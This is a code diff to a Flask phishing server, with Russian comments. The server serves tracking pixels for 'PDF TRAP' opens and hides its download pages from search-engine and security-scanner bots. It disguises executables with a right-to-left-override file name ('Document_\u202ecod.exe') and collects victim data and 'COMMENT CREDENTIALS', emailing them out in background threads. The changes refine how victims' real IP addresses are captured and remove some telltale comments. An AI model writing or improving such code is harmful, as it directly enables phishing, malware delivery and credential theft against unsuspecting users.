@@ -84,7 +84,8 @@ def health_check(): return "OK", 200
 def tracking_pixel():
     source = request.args.get('source', 'unknown')
     uid = request.args.get('uid', 'unknown')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    # Получаем реальный IP для пикселя
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     threading.Thread(target=send_email_background, args=({'meta': {'url': f'PDF TRAP ({uid})', 'source': source}}, ip, "PDF Reader", "PDF OPENED")).start()
     return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})
 
@@ -119,7 +120,6 @@ def view_files(unique_id):
 
 @app.route('/verify/<uid>/<path:filename>')
 def verify_download(uid, filename):
-    # Фильтр ботов, чтобы не палить фишинг сканерам
     user_agent = request.headers.get('User-Agent', '').lower()
     bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse']
     if any(bot in user_agent for bot in bots): return "<h1>Loading...</h1>", 200
@@ -132,7 +132,6 @@ def download_file(uid, filename):
     target_file = next((f for f in data['files'] if f['name'] == filename), None)
     if target_file:
         spoofed_name = target_file['name']
-        # Если это exe/bat, добавляем спуфинг расширения
         if target_file['saved_name'].endswith(('.exe', '.scr', '.bat')): spoofed_name = "Document_\u202ecod.exe"
         return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=spoofed_name)
     return abort(404)
@@ -148,14 +147,25 @@ def collect_data():
         if request.is_json:
             data = request.json
         else:
-            # Парсинг для sendBeacon (он шлет blob/text)
             data = json.loads(request.data.decode('utf-8'))
         
-        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        # --- ОБНОВЛЕННАЯ ЛОГИКА IP ---
+        # Берем первый IP из списка X-Forwarded-For, это реальный IP клиента
+        forwarded_for = request.headers.get('X-Forwarded-For', '')
+        if forwarded_for:
+            real_ip = forwarded_for.split(',')[0].strip()
+        else:
+            real_ip = request.remote_addr
+
+        # Добавляем отладочную инфу в данные
+        if 'network' not in data: data['network'] = {}
+        data['network']['server_detected_ip'] = real_ip
+        data['network']['raw_headers_ip'] = forwarded_for
+        
         user_agent = request.headers.get('User-Agent')
         trigger = data.get('meta', {}).get('trigger', 'Unknown')
         
-        threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
+        threading.Thread(target=send_email_background, args=(data, real_ip, user_agent, trigger)).start()
         return jsonify({"status": "ok"})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
@@ -169,9 +179,11 @@ def add_comment():
         db[uid]['comments'].append({'username': data.get('username'), 'text': data.get('text'), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
         save_db(db)
         
-        # Логируем всё, включая пароль и буфер обмена (если пришел)
-        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        threading.Thread(target=send_email_background, args=(data, user_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
+        # Логируем IP правильно
+        forwarded_for = request.headers.get('X-Forwarded-For', '')
+        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
+        
+        threading.Thread(target=send_email_background, args=(data, real_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 404
 
